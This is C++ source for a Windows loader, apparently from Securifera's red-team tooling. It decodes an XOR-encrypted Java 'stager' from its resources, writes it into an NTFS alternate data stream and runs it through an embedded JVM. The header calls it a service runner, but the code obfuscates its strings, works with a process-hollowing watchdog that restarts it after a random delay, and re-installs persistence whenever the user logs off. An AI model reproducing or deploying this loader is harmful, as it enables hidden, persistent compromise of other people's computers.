//***************************************************************
/*  Author: Securifera
/   Description: 
/           This application sets up and runs the java application
/   as a service.
/
/   Revision History:
/           Fixed bug that was causing the service to close on 
/                logoff.  Added -Xrs option to jvm startup arguments.
*/
//****************************************************************

#include "jarldr.h"
#include "..\log.h"
#include "..\utilities.h"
#include "resource.h"
#include <process.h>
#include <ShlObj.h>


#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "User32.lib")

#ifdef _DBG
#pragma comment(lib, "Shell32.lib")		
#endif


//JVM DLL instance
HINSTANCE hDllInstance;
JavaVM *vm;
static HMODULE dll_handle = NULL;

#ifdef _LDR

unsigned int __stdcall Thread_Start_JVM(void* a) {

	PWATCHDOG_THREAD_STRUCT rtr_struct_ptr = (PWATCHDOG_THREAD_STRUCT)a;
	
	//Return if the stopEvent has not been set
	HANDLE stopEvent = rtr_struct_ptr->thread_stop_event;
	if( !stopEvent)
		return 1;

	//Get jar ads file location
    char ads_path[400];
	LoadString( dll_handle, IDS_ADS_FILE_PATH, ads_path, 400);
	if( strlen( ads_path ) == 0 ){
#ifdef _DBG
		Log( "[-] Error: ADS file path not set. Exiting\n");
#endif
		return 1;
	}

	//Deobfuscate it
	char *ads_path_ptr = decode_split(ads_path, 400);
	std::string classPath(ads_path_ptr);
	free(ads_path_ptr);

	//Add the ADS reference
	classPath.append(COLON);

		
	//Extract java stager
	if( !ExtractStager( classPath )){
#ifdef _DBG
		Log( "Unable to extract stager.\n", GetLastError());
#endif
        return 1;	
	} 
	
	//Get jvm string from resource table
	std::string jvm_str;
    char jvm_buf[400];
	LoadString(dll_handle, IDS_JVM_PATH, jvm_buf, 400);
	if( strlen( jvm_buf ) != 0 ){

		//Deobfuscate it
		char *jvm_ptr = decode_split(jvm_buf, 400);
		jvm_str.assign(jvm_ptr);
		free(jvm_ptr);
	}
	
	InvokeMain( nullptr, classPath, jvm_str.c_str());

	//Set the event
	if( stopEvent ){
#ifdef _DBG
		Log( "[-] Setting stop event.\n" );
#endif
		SetEvent(stopEvent);

	}

	return 1;

}

PERSIST_STRUCT *persist_struct_ptr = nullptr;
HINSTANCE hInstance;
LRESULT CALLBACK WndMsgHandler(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam) {

	switch (msg) {
		case WM_QUERYENDSESSION:
			 //::MessageBox(0,"Shutting down.",0,0);
			 AddPersistence(persist_struct_ptr);
			 return 0;
		default:
			 break;

		
	}

	return DefWindowProc(hwnd, msg, wparam, lparam);
	 
}

void MessageLoop() {

	WNDCLASSEX wcex = {};
	LPCTSTR wname;

	wname = TEXT("_lwd");
	wcex.cbSize = sizeof(wcex);
	wcex.style = 0;
	wcex.lpfnWndProc = WndMsgHandler;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0;
	wcex.hInstance = hInstance;
	wcex.hIcon = NULL;
	wcex.hCursor = NULL;
	wcex.hbrBackground = NULL;
	wcex.lpszMenuName = NULL;
	wcex.lpszClassName	= wname;
	wcex.hIconSm = NULL;

	ATOM windowAtom = RegisterClassEx(&wcex);
	if (windowAtom == NULL){
#ifdef _DBG
		Log("[-] RegisterClass failed:");
#endif
	}

	/* Create the window */
	HWND systray_hwnd = CreateWindow( (LPCTSTR)wname, "", WS_OVERLAPPED, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
	if( systray_hwnd == NULL ){
#ifdef _DBG
		Log("[-] CreateWindow failed:");
#endif
	}

	// Run the message loop.
	MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

#ifdef _DBG
		Log("[-] Stop Event signaled.");
#endif

}


unsigned int __stdcall StartWatchDog(void* a) {

	PWATCHDOG_THREAD_STRUCT rtr_struct_ptr = (PWATCHDOG_THREAD_STRUCT)a;
		
	//Return if the PID hasn't been set
	unsigned long proc_pid = rtr_struct_ptr->watchdog_pid;
	if( !proc_pid)
		return 1;

	//Return if the stopEvent has not been set
	HANDLE stopEvent = rtr_struct_ptr->thread_stop_event;
	if( !stopEvent)
		return 1;

	//Return if the stopEvent has not been set
	std::string dll_path = rtr_struct_ptr->persist_ptr->dll_file_path;
	if( dll_path.empty() )
		return 1;
		
	//Free memory
	//free(rtr_struct_ptr);

	//Get the handle to the process
	HANDLE watch_dog_handle = OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE, TRUE, proc_pid);
	if( watch_dog_handle == NULL ){
#ifdef _DBG
		Log("[+] Unable to open watchdog process.\n");
#endif
		return 1;
	}

	//Add the manager terminate event
	HANDLE  handles[2] = { stopEvent, watch_dog_handle };
	DWORD handleIdx = WaitForMultipleObjects(2, handles, FALSE/*bWaitAll*/, INFINITE);

#ifdef _DBG
	Log( "[+] Watchdog function signaled %d.\n", handleIdx);
#endif

	//Check for reason of exiting
	if( handleIdx == 0 ){

#ifdef _DBG
		Log( "[+] Terminating Watchdog.\n" );
#endif

		//Called by manager so kill the watch dog
		TerminateProcess(watch_dog_handle,1);

	} else if( handleIdx == 1 ){
				
		//Range from 1 mins to 2
		unsigned int rand_num =  ( rand() % (1000 * 60 * 1) ) + (1000 * 60 * 1);
		Sleep(rand_num);

#ifdef _DBG
		Log("[+] Restarting monitored process.\n");
#endif
		//Write the DLL to disk before attempting to load
		WriteDllToDisk(persist_struct_ptr);

		//Load the dll library again which will restart the watch dog and this process
		HMODULE ret = LoadLibrary(dll_path.c_str());
#ifdef _DBG
		Log( "[+] LoadLibrary addr %p: %s.\n", ret, dll_path.c_str());
#endif
				
	}

	exit(1);
	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance_param,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{

#ifdef _DBG
	std::string str_path("C:\\Users\\Public");
	str_path.append("\\jldr.log");
	SetLogPath(str_path.c_str());
	
#endif

	persist_struct_ptr = (PERSIST_STRUCT *)calloc(1, sizeof(PERSIST_STRUCT));
	if( persist_struct_ptr == nullptr ){
#ifdef _DBG
		Log( "[-] Unable to allocate memory. Quitting\n" );
#endif
		return 1;
	}

	char reg_str_buf[400];
	std::string reg_str;
	LoadString(dll_handle, IDS_REG_KEY, reg_str_buf, 400);
	if( strlen( reg_str_buf ) != 0 ){	
		
		//Deobfuscate it
		char *reg_ptr = decode_split(reg_str_buf, 400);
		reg_str.assign(reg_ptr);
		free(reg_ptr);

#ifdef _DBG
		Log( "[+] Registry Key Name: %s\n", reg_str.c_str());
#endif
	}

	//Set registry path
	persist_struct_ptr->reg_key_path.assign( reg_str );

	hInstance = hInstance_param;
	//TMP
	char *tmp_ptr = decode_split("\x5\x4\x4\xd\x5\x0",6);
	//TEMP
	char *temp_ptr = decode_split("\x5\x4\x4\x5\x4\xd\x5\x0",8);

	size_t len;
	//Get TEMP env
	char * temp_env = nullptr;
	_dupenv_s (&temp_env, &len, temp_ptr);
	
	//Get TMP env - this is the one we set in proc hollow
	char * tmp_env = nullptr;
	_dupenv_s (&tmp_env, &len, tmp_ptr);
	bool watchdog = true;
	if( tmp_env && strlen(tmp_env) > 0 ){

#ifdef _DBG
		Log( "Path: %s\n", tmp_env);
#endif

		//Reset
		if( temp_env && (strcmp(tmp_env, temp_env) != 0)  ){		
			//Set TMP back to TEMP
			SetEnvironmentVariable(tmp_ptr, temp_env);
			
		} else {
			//Reset TMP var
			//SetEnvironmentVariable(tmp_ptr, "");
			watchdog = false;
		}
	}

	//Free memory
	free(temp_ptr);
	free(tmp_ptr);

	std::string tmp_env_str(tmp_env);
	free(tmp_env);

	//Create an event to break out 
	HANDLE stopEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	PWATCHDOG_THREAD_STRUCT thread_struct = (PWATCHDOG_THREAD_STRUCT)calloc(1, sizeof(WATCHDOG_THREAD_STRUCT));
					
	//Set pointer to this
	thread_struct->thread_stop_event = stopEvent;

	//Setup 
	if( watchdog ){
	
		unsigned long proc_pid = 0;
		//Find last colon if it exists
		size_t pos = tmp_env_str.find_last_of("|");
		if( pos != std::string::npos){
			std::string proc_str = tmp_env_str.substr(pos + 1, std::string::npos );
			tmp_env_str = tmp_env_str.substr(0, pos );
			proc_pid = strtoul (proc_str.c_str(), NULL, 0);

	#ifdef _DBG
			Log("[+] Watch dog pid: %d\n", proc_pid);
	#endif
		}

		//Assign DLL
		persist_struct_ptr->dll_file_path.assign( tmp_env_str );

		//Load DLL into memory
		if( !ReadDllIntoMemory( persist_struct_ptr ) ){
	#ifdef _DBG
			Log("[-] Error: Unable to read DLL into memory. Exiting\n");
	#endif
			return 1;
		}

		thread_struct->watchdog_pid = proc_pid;
		thread_struct->persist_ptr = persist_struct_ptr;						

		//Start the watch dog thread for the watch dog process
		unsigned ret;
		HANDLE wd_thread_handle = (HANDLE)_beginthreadex(0, 0, StartWatchDog,(void*)thread_struct,0,&ret);
		if( !(size_t)wd_thread_handle ){
	#ifdef _DBG
			Log( "[-] Manager::Start - unabled to start watch dog thread.\n" );
	#endif
		}
	
		//Remove the DLL
		RemovePersistence( persist_struct_ptr );

		//Start the watch dog thread for the watch dog process
		HANDLE jvm_thread_handle = (HANDLE)_beginthreadex(0, 0, Thread_Start_JVM,(void*)thread_struct,0,&ret);
		if( !(size_t)jvm_thread_handle ){
	#ifdef _DBG
			Log( "[-] WinMain - unabled to start jvm thread.\n");
	#endif
		}
		
		//Start the main window loop
		MessageLoop();
	
	} else {

		//Standalone exe
		Thread_Start_JVM(thread_struct);
	
	}

	return 0;
}

#endif 

//=========================================================================
/**
	Extract the stager and write to ADS
*/
bool ExtractStager( std::string passedPath){

    HGLOBAL hResourceLoaded;  // handle to loaded resource
    HRSRC   hRes;              // handle/ptr to res. info.
    char    *lpResLock;        // pointer to resource data
    DWORD   dwSizeRes;
    std::string strOutputLocation;
    std::string strAppLocation;
		
	DWORD dwRet = 0;

	HANDLE hStream = CreateFile( passedPath.c_str(), GENERIC_WRITE,
                             FILE_SHARE_WRITE, NULL,
                             OPEN_ALWAYS, 0, NULL );

    if( hStream != INVALID_HANDLE_VALUE ){

		
		//Get the resource
		hRes = FindResource(dll_handle, MAKEINTRESOURCE(IDR_BIN2) ,"JRR");
		if( hRes == nullptr ){
		
#ifdef _DBG
			Log( "Unable to find java resource.\r\n");
#endif
			return false;
		}

		hResourceLoaded = LoadResource(dll_handle, hRes);
		if( hResourceLoaded == nullptr ){
		
#ifdef _DBG
			Log( "Unable to load resource.\r\n");
#endif
			return false;
		}

		lpResLock = (char *) LockResource(hResourceLoaded);
		dwSizeRes = SizeofResource(dll_handle, hRes);

		//Write file if not zero
		if( !dwSizeRes ){
#ifdef _DBG
			Log( "Resource size is zero.\r\n");
#endif
			return false;
		}

		//Allocate memory
		char *buf = (char *)malloc( dwSizeRes );
		memcpy( buf, lpResLock, dwSizeRes );

		//Decode XOR
		char *xor_key = "\xa3\x45\x23\x06\xf4\x21\x42\x81\x72\x11\x92\x29";
		int len = strlen(xor_key);

		//XOR the data
		for( DWORD i = 0; i < dwSizeRes; i++ )
			buf[i] = buf[i] ^ xor_key[i % len];			
		
		
		if( !WriteFile(hStream, buf, dwSizeRes, &dwRet, NULL)){
#ifdef _DBG
			Log( "Unable to write java file.\r\n");
#endif
			free(buf);
			return false;
		} else {

#ifdef _DBG
			Log( "Stager written to ADS.\r\n");
#endif

		}
		//Free mem
		free(buf);
		

		CloseHandle(hStream);
	}

	return true;

}

////=========================================================================
///**
//	Gets the installed java version
//*/
//void GetJavaVersion(std::string& sJavaVersion){
//	char   psBuffer[128];
//	std::string javaVersionArray[5];
//	FILE   *pPipe;
//
//	/* Run DIR so that it writes its output to a pipe. Open this
//	* pipe with read text attribute so that we can read it 
//	* like a text file. 
//	*/
//    //java -version 2>&1
//	char *ver_str = decode_split("\x6\xa\x6\x1\x7\x6\x6\x1\x2\x0\x2\xd\x7\x6\x6\x5\x7\x2\x7\x3\x6\x9\x6\xf\x6\xe\x2\x0\x3\x2\x3\xe\x2\x6\x3\x1",36);
//	if( (pPipe = _popen( ver_str, "rt" )) == NULL ){
//		free(ver_str);
//		exit( 1 );
//	}
//	//free mem
//	free(ver_str);
//
//	/* Read pipe until end of file, or an error occurs. */
//	int i = 0;
//	while(fgets(psBuffer, 128, pPipe)){
//		javaVersionArray[i] = std::string(psBuffer);
//		i++;
//	}
//
//	/* Close pipe and print return value of pPipe. */
//	if (feof(pPipe))
//		_pclose( pPipe) ;
//#ifdef _DBG
//	else
//		Log( "Error: Failed to read the pipe to the end.\n");
//#endif
//
//	//Parse out the version
//	int firstQuote  = (int)javaVersionArray[0].find_first_of("\"");
//	int secondQuote = (int)javaVersionArray[0].find_last_of("\"");
//
//	sJavaVersion = javaVersionArray[0].substr(firstQuote + 1, (secondQuote - firstQuote) - 1);
//
//
//}

//*****************************************
/*
*  Get the path to the JVM. Returns null if it's not found
*  Requires memory cleanup if buffer is returned.
*/
char *GetJvmPath(){

	char *ret_path = nullptr;

	//Check registry first
	//SOFTWARE\JavaSoft\Java Runtime Environment
	char *key_str = decode_split("\x5\x3\x4\xf\x4\x6\x5\x4\x5\x7\x4\x1\x5\x2\x4\x5\x5\xc\x5\xc\x4\xa\x6\x1\x7\x6\x6\x1\x5\x3\x6\xf\x6\x6\x7\x4\x5\xc\x5\xc\x4\xa\x6\x1\x7\x6\x6\x1\x2\x0\x5\x2\x7\x5\x6\xe\x7\x4\x6\x9\x6\xd\x6\x5\x2\x0\x4\x5\x6\xe\x7\x6\x6\x9\x7\x2\x6\xf\x6\xe\x6\xd\x6\x5\x6\xe\x7\x4",88);
	HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, key_str, 0, KEY_READ, &hKey) == ERROR_SUCCESS){

		DWORD type;
		DWORD length = MAX_PATH;
		char buf[MAX_PATH];
		memset(buf,0, MAX_PATH);

		//Get current version
		//CurrentVersion
		char *name = decode_split("\x4\x3\x7\x5\x7\x2\x7\x2\x6\x5\x6\xe\x7\x4\x5\x6\x6\x5\x7\x2\x7\x3\x6\x9\x6\xf\x6\xe",28);
		if (RegQueryValueEx(hKey, name, NULL, &type, (LPBYTE)buf, &length) == ERROR_SUCCESS){
			//free memory
			free(name);
			//If the return type is a string
			if (type == REG_SZ && length > 0){

				//Add the current version and attempt to get JVM path
				std::string cur_ver_key(key_str);
				free(key_str);
				cur_ver_key.append("\\").append(buf);

				//Close previous key
				RegCloseKey(hKey);

				//Open new key
				if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, cur_ver_key.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS){

					length = MAX_PATH;
					memset(buf,0, MAX_PATH);

					//Get current version
					//RuntimeLib
					name = decode_split("\x5\x2\x7\x5\x6\xe\x7\x4\x6\x9\x6\xd\x6\x5\x4\xc\x6\x9\x6\x2",20);
					if (RegQueryValueEx(hKey, name, NULL, &type, (LPBYTE)buf, &length) == ERROR_SUCCESS){
						//free memory
						free(name);
						//If the return type is a string
						if (type == REG_SZ && length > 0){
							ret_path = (char *)calloc(length, 1);
							memcpy(ret_path, buf, length);
						}
					}
				}
			}
		}
	}

	return ret_path;
}

//Load JVM and if it fails load microsoft runtime first
bool LoadJvmCRuntime(std::string jvm_path){


	//Check if default path exists - msvcr100.dll
	if( FileExists(jvm_path)){ 

		hDllInstance = LoadLibrary(jvm_path.c_str());
			
		//Try and load the jvm dll again
		if(hDllInstance == NULL){
#ifdef _DBG
			//Write error log
			std::string sFailed = std::string("Failed to load C++ Runtime, Path: ");
			sFailed.append(jvm_path).append("\n");
			Log((char *)sFailed.c_str());
#endif

			return FALSE;
		}
	} else {
#ifdef _DBG
		//Write error log
		std::string sFailed = std::string("C++ Runtime, Path: ");
		sFailed.append(jvm_path);
		sFailed.append(" does not exist.\n");
		Log((char *)sFailed.c_str());
#endif
	}	
			
	return (hDllInstance != NULL);

}

//Load JVM and if it fails load microsoft runtime first
bool LoadJvmLibrary(char *jvm_path){

	std::string sJavaDll;
	std::string sLibPath;

	 //Set the dir
	SetCurrentDirectory(jvm_path);
		
	//Close the file handle
	hDllInstance = LoadLibrary(jvm_path);

	//If didn't load, try to load msvcr100 first
	if(hDllInstance == NULL){

		//systemroot
		char *root = decode_split("\x7\x3\x7\x9\x7\x3\x7\x4\x6\x5\x6\xd\x7\x2\x6\xf\x6\xf\x7\x4",20);

		char * pSystemRoot = nullptr;
		size_t len;
		_dupenv_s (&pSystemRoot, &len, root );
		free(root);
			
		//Check if default path exists - \\msvcr100.dll
		char *mscrt = decode_split("\x5\xc\x5\xc\x6\xd\x7\x3\x7\x6\x6\x3\x7\x2\x3\x1\x3\x0\x3\x0\x2\xe\x6\x4\x6\xc\x6\xc",28);
		sLibPath.assign(pSystemRoot).append(mscrt);
		free(mscrt);
	    if( FileExists(sLibPath)){ 

			hDllInstance = LoadLibrary(sLibPath.c_str());
			
			//Try and load the jvm dll again
			if(hDllInstance != NULL){
			    hDllInstance = LoadLibrary( jvm_path );
			} else {

#ifdef _DBG
			   	//Write error log
				std::string sFailed = std::string("Failed to load C++ Runtime, Path: ");
				sFailed.append(sLibPath).append("\n");
				Log((char *)sFailed.c_str());
#endif

				return FALSE;
			}
		} else {
#ifdef _DBG
			//Write error log
			std::string sFailed = std::string("C++ Runtime, Path: ");
			sFailed.append(sLibPath);
			sFailed.append(" does not exist.\n");
			Log((char *)sFailed.c_str());
#endif
		}
	}
			
	return (hDllInstance != NULL);

}

//=========================================================================
/**
	Main Java Entry Point
*/
BOOL WINAPI InvokeMain( std::string *serviceName, std::string adsPath, const char *jvm_path_param ) {
	JavaVMInitArgs vm_args;
	JavaVMOption options[2];
	jint res;
	JNIEnv *env;
	jclass cls;
	jmethodID mid;
	jclass stringClass;
    jobjectArray args;
	jstring jstr;
	
	std::string sJavaVersion, sJavaRoot, jvmPathStr;
	
	//Set the jvm path
	char* jvmPath;
	if( jvm_path_param && strlen(jvm_path_param) > 0 ){

		//Append the jvm dll
		jvmPathStr.assign(jvm_path_param);
		//\jvm.dll
		char *dec_jvm = decode_split("\x5\xc\x6\xa\x7\x6\x6\xd\x2\xe\x6\x4\x6\xc\x6\xc",16);
		jvmPathStr.append(dec_jvm);
		free(dec_jvm);
		
		//Set jvmPath
		jvmPath = (char *)calloc( jvmPathStr.length() + 1, 1);
		memcpy(jvmPath, jvmPathStr.c_str(), jvmPathStr.length());
	
	} else {
		//Check registry
		jvmPath = GetJvmPath();
	}
	

	if( jvmPath == nullptr ){
#ifdef _DBG
		//Print the last error
		Log("Unable to find java runtime DLL path.\n");					
#endif
		return FALSE;

	} else {

#ifdef _DBG
		//Print the last error
		Log("Java runtime DLL path: %s.\n", jvmPath);					
#endif

	}

	//Load the C runtime to ensure jvm loads
	jvmPathStr.assign(jvmPath);
	std::size_t found = jvmPathStr.find_last_of("\\");
	jvmPathStr.assign( jvmPathStr.substr(0, found) );
	found = jvmPathStr.find_last_of("\\");
	jvmPathStr.assign( jvmPathStr.substr(0, found + 1) );

	//msvcr100.dll
	char *mscrt = decode_split("\x6\xd\x7\x3\x7\x6\x6\x3\x7\x2\x3\x1\x3\x0\x3\x0\x2\xe\x6\x4\x6\xc\x6\xc",24);
	jvmPathStr.append(mscrt);
	free(mscrt);

	//If the file couldn't be found or loaded
	if( !LoadJvmCRuntime( jvmPathStr ) ) {

#ifdef _DBG
		std::string sFailed("Failed to Load JVM DLL, Path: ");
		sFailed.append(jvmPathStr).append("\n");
		//Log
		Log((char *)sFailed.c_str());
		Log("Error code = %d\n", GetLastError());					
#endif
				
		//Free memory
		free(jvmPath);
		return FALSE;	

	} else {
	
#ifdef _DBG
		//Print status
		Log("Loaded C Runtime Library.\n");					
#endif
	
	}
			  
	
	//If the file couldn't be found or loaded
	if( !LoadJvmLibrary( jvmPath ) ) {

#ifdef _DBG
		std::string sFailed("Failed to Load JVM DLL, Path: ");
		sFailed.append(jvmPath).append("\n");
		//Log
		Log((char *)sFailed.c_str());
		Log("Error code = %d\n", GetLastError());					
#endif
				
		//Free memory
		free(jvmPath);
		return FALSE;	
	} else {
	
#ifdef _DBG
		//Print status
		Log("Loaded JVM Library.\n");					
#endif
	
	}
		
	//Free memory
	free(jvmPath);
		
	//resolve the function pointer JNI_CreateJVM
	//JNI_CreateJavaVM string
	char *create_jvm_str = decode_split("\x4\xa\x4\xe\x4\x9\x5\xf\x4\x3\x7\x2\x6\x5\x6\x1\x7\x4\x6\x5\x4\xa\x6\x1\x7\x6\x6\x1\x5\x6\x4\xd",32);
	CreateJavaVM createJVM = (CreateJavaVM)GetProcAddress(hDllInstance, create_jvm_str);
	free(create_jvm_str);
	
	//-Djava.class.path=
	char *class_path = decode_split("\x2\xd\x4\x4\x6\xa\x6\x1\x7\x6\x6\x1\x2\xe\x6\x3\x6\xc\x6\x1\x7\x3\x7\x3\x2\xe\x7\x0\x6\x1\x7\x4\x6\x8\x3\xd",36);
	std::string classPath(class_path);
	free(class_path);	
	classPath.append(adsPath);
	
	//-Xrs
	char *ignore_sig = decode_split("\x2\xd\x5\x8\x7\x2\x7\x3",8);
	options[0].optionString = const_cast<char*>(classPath.c_str()); // application class path 
	options[1].optionString = ignore_sig; // ignore os signals
	
	vm_args.version = JNI_VERSION_1_4; //JNI Version 1.4 and above
	vm_args.options = options;
	vm_args.nOptions = 2;
	vm_args.ignoreUnrecognized = JNI_FALSE;

	//Create the JVM
	res = createJVM(&vm, (void **)&env, &vm_args);
	free(ignore_sig);
	if (res < 0)  {
#ifdef _DBG
		Log( "Error creating JVM\n");
#endif
		return FALSE;
	} else {
	
#ifdef _DBG
		Log( "JVM created.\n");
#endif	
	}

	//Find the java class
	//stager/Stager
	char *start_class = decode_split("\x7\x3\x7\x4\x6\x1\x6\x7\x6\x5\x7\x2\x2\xf\x5\x3\x7\x4\x6\x1\x6\x7\x6\x5\x7\x2",26);
    cls = env->FindClass(start_class);
	free(start_class);

	//Check if it was found
	if( cls == nullptr ){
		#ifdef _DBG
			Log( "Unable to locate Stager Class\n");
		#endif
		return FALSE;	
	}
	
	// invoke the main method
	//([Ljava/lang/String;)V
	char *java_str = decode_split("\x2\x8\x5\xb\x4\xc\x6\xa\x6\x1\x7\x6\x6\x1\x2\xf\x6\xc\x6\x1\x6\xe\x6\x7\x2\xf\x5\x3\x7\x4\x7\x2\x6\x9\x6\xe\x6\x7\x3\xb\x2\x9\x5\x6",44);
    //main
	char *main_str = decode_split("\x6\xd\x6\x1\x6\x9\x6\xe",8);
	mid = env->GetStaticMethodID(cls, main_str, java_str);
	free(java_str);
	free(main_str);
	
    //Set arguments
	std::string arg1;
	if(serviceName != nullptr)
		arg1.assign(*serviceName);

	jstr = env->NewStringUTF(arg1.c_str());
    if (jstr == NULL) {
#ifdef _DBG
		Log( "Unable to create string\n");
#endif
        return FALSE;
    }

	//java/lang/String
	char *str_param = decode_split("\x6\xa\x6\x1\x7\x6\x6\x1\x2\xf\x6\xc\x6\x1\x6\xe\x6\x7\x2\xf\x5\x3\x7\x4\x7\x2\x6\x9\x6\xe\x6\x7",32);
    stringClass = env->FindClass(str_param);
    args = env->NewObjectArray(1, stringClass, env->NewStringUTF(""));
	env->SetObjectArrayElement(args,0,jstr);

    env->CallStaticVoidMethod(cls, mid, args);

	//if there is any exception log
	if(env->ExceptionCheck()) {

#ifdef _DBG
		Log( "Exception occured..\n");
		env->ExceptionDescribe();
#endif
		return FALSE;
	} 

	//blocking call
	vm->DestroyJavaVM();	
	return TRUE;
}

//=========================================================================
/**
	Shutdown method
*/
VOID WINAPI InvokeShutdown() {
    JNIEnv *env;

#ifdef _DBG
	Log( "[+] Shutting down JVM.");
#endif

	//Since the JVM was created in a another thread. We have to attach the thread 
	//to JVM before making JVM calls
	vm->AttachCurrentThread((void **)&env, 0); 
	vm->DestroyJavaVM();
	vm->DetachCurrentThread();
	
#ifdef _DBG
	Log( "[+] JVM Shutdown.");
#endif
}


////=========================================================================
///**
//	Attempts to find the java install
//*/
//BOOL PrepareJava(std::string pJavaVersion, std::string& sJavaPath ){
//    
//	WIN32_FIND_DATA fdata;
//    HANDLE found;
//	std::string fileName;
//	std::string javaVersionInt;
//	std::string genericRuntime;
//	std::string genericRuntime2;
//	boolean foundJava = false;
//	
//	int firstPeriod  = (int)pJavaVersion.find_first_of(".");
//		
//	char *jre_str = decode_split("\x6\xa\x7\x2\x6\x5",6);
//	//Get the java version
//	if( firstPeriod != std::string::npos ) {	
//		javaVersionInt.assign(pJavaVersion.substr(firstPeriod + 1, 1)); 
//		genericRuntime.append(jre_str).append(javaVersionInt);
//	} else {
//		genericRuntime.append(jre_str);
//	}
//
//	//Set to runtime 7
//	genericRuntime2.append(jre_str).append("7");	
//
//	std::string javaPath(JAVADIR);
//    //Set to x86 dir if 64bit since we are x86
//	if( IsWow64() && FileExists(JAVADIR_X64)){
//		javaPath = JAVADIR_X64;
//	}
//	
//	char *jdk_str = decode_split("\x6\xa\x6\x4\x6\xb",6);
//	//Check if default path exists
//	if(!foundJava){
//	
//		//Find Image Files
//		if(SetCurrentDirectory(javaPath.c_str())){
//
//			found = FindFirstFile("*",&fdata);
//			if (found != INVALID_HANDLE_VALUE)
//			{
//				do
//				{
//					if (fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
//						if(strstr(fdata.cFileName,pJavaVersion.c_str()) != NULL){
//							fileName = std::string(fdata.cFileName);
//						
//							//If the path is a jdk instead of a jre then append the correct path
//							if(javaPath.find(jdk_str) == std::string::npos){
//							   javaPath.append("\\").append(fdata.cFileName).append("\\").append(jre_str);
//							} else {
//							   javaPath.append("\\").append(fdata.cFileName);
//							}
//
//							sJavaPath.assign(javaPath);
//						
//							//Ensure file exists
//							foundJava=true;							
//							break;
//
//						} else if(strcmp(genericRuntime.c_str(), fdata.cFileName) == 0){
//						   
//							javaPath.append("\\").append(fdata.cFileName);
//							sJavaPath.assign(javaPath);
//							
//							foundJava=true;
//							break;
//
//						} else if(strcmp(genericRuntime2.c_str(), fdata.cFileName) == 0){
//						   
//							javaPath.append("\\").append(fdata.cFileName);
//							sJavaPath.assign(javaPath);
//							
//							foundJava=true;
//							break;
//
//						}
//					}
//					else
//						continue;
//				}
//				while (FindNextFile(found, &fdata));
//
//				FindClose(found);
//			}
//		}
//
//
//#ifdef _DBG
//		Log((char *)javaPath.c_str());
//#endif
//
//		sJavaPath = javaPath;
//		
//		//If we found a java path then load it
//		if(foundJava){
//		   foundJava = LoadJava(sJavaPath);	 
//		}
//    }
//
//	//free mem
//	free(jre_str);
//	free(jdk_str);
//
//	return foundJava;
//}

////=========================================================================
///**
//	Loads java
//*/
//BOOL LoadJava(std::string sJavaPath){
//    
//	std::string sJavaDll;
//	std::string sLibPath;
//
//	//Load the JVM Dll
//	sJavaDll.assign(sJavaPath).append(JVM_CLIENT_PATH).append(JVM_NAME);
//		
//	//Check if client path exists
//	if( !FileExists(sJavaDll)){ 
//		
//		//Close and try the server path
//		sJavaDll.assign(sJavaPath).append(JVM_SERVER_PATH).append(JVM_NAME);
//		if( !FileExists(sJavaDll)){ 
//
//#ifdef _DBG
//			//Write error log
//			std::string sFailed = std::string("Failed to find jvm dll, Path: ");
//			sFailed.append(sJavaDll).append("\n");
//			Log((char *)sFailed.c_str());
//#endif
//
//			return FALSE;
//		}
//	}
//
//    //Set the dir
//	SetCurrentDirectory(sJavaDll.c_str());
//		
//	//Close the file handle
//	hDllInstance = LoadLibrary(sJavaDll.c_str());
//
//	//If didn't load, try to load msvcr100 first
//	if(hDllInstance == NULL){
//
//		//systemroot
//		char *root = decode_split("\x7\x3\x7\x9\x7\x3\x7\x4\x6\x5\x6\xd\x7\x2\x6\xf\x6\xf\x7\x4",20);
//
//		char * pSystemRoot = nullptr;
//		size_t len;
//		_dupenv_s (&pSystemRoot, &len, root );
//		free(root);
//			
//		//Check if default path exists
//		sLibPath.assign(pSystemRoot).append(MSVCR_PATH);
//	    if( FileExists(sLibPath)){ 
//
//			hDllInstance = LoadLibrary(sLibPath.c_str());
//			
//			//Try and load the jvm dll again
//			if(hDllInstance != NULL){
//			    hDllInstance = LoadLibrary(sJavaDll.c_str());
//			} else {
//
//#ifdef _DBG
//			   	//Write error log
//				std::string sFailed = std::string("Failed to load C++ Runtime, Path: ");
//				sFailed.append(sJavaPath).append("\n");
//				Log((char *)sFailed.c_str());
//#endif
//
//				return FALSE;
//			}
//		} 
//	}
//			
//	return (hDllInstance != NULL);
//
//}

//Returns whether a file exists
BOOL FileExists(std::string thePath){
	return GetFileAttributes(thePath.c_str()) != INVALID_FILE_ATTRIBUTES;
}
